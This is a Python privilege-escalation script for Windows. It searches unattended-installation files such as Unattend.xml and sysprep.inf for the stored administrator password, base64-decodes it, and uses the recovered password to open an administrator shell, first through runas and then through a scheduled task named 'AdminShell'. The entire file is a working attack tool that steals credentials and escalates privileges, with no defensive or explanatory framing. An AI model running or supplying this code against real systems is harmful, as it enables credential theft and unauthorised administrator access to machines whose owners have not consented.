import os
import re
import base64
import subprocess

# Common file locations for unattended installation files
file_locations = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\autounattend.xml",
    r"C:\Windows\System32\sysprep\sysprep.inf"
]

def find_admin_password(file_path):
    """Extracts the administrator password from unattended installation files."""
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            content = file.read()
            match = re.search(r"<AdministratorPassword>\s*<Value>(.*?)</Value>", content)
            if match:
                return match.group(1)  # Extract encoded password
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
    return None

def decode_password(encoded_password):
    """Attempts to decode the password (Base64 Fix Applied)."""
    try:
        decoded_bytes = base64.b64decode(encoded_password + "==")  # Fix incorrect padding
        return decoded_bytes.decode("utf-8", errors="ignore")
    except Exception as e:
        print(f"Error decoding password: {e}")
        return encoded_password  # Return as-is if decoding fails

def try_runas(decoded_password):
    """Tries to escalate privileges using runas command."""
    command = f'runas /user:Administrator "cmd.exe"'
    try:
        subprocess.run(command, input=f"{decoded_password}\n", text=True, shell=True)
        print("\n[*] Runas command executed. Check if an admin shell opened.")
    except Exception as e:
        print(f"[*] Runas failed: {e}")

def create_scheduled_task(decoded_password):
    """Creates a scheduled task to open an admin shell."""
    print("[*] Creating a scheduled task to bypass runas restrictions...")
    
    # Command to create the task
    create_task = f'schtasks /create /tn "AdminShell" /tr "cmd.exe" /sc once /st 00:00 /ru Administrator /rp "{decoded_password}"'
    
    # Execute the task creation
    os.system(create_task)

    # Run the task
    os.system('schtasks /run /tn "AdminShell"')

def main():
    print("\n=== Privilege Escalation Script ===\n")
    
    for file in file_locations:
        if os.path.exists(file):
            print(f"Scanning: {file}")
            encoded_password = find_admin_password(file)
            if encoded_password:
                print(f"Extracted Password (Encoded): {encoded_password}")
                decoded_password = decode_password(encoded_password)
                print(f"Decoded Password: {decoded_password}")
                
                # Try runas
                try_runas(decoded_password)
                
                # If runas fails, try scheduled task
                create_scheduled_task(decoded_password)
                return
    
    print("No unattended installation files found with credentials.")

if __name__ == "__main__":
    main()
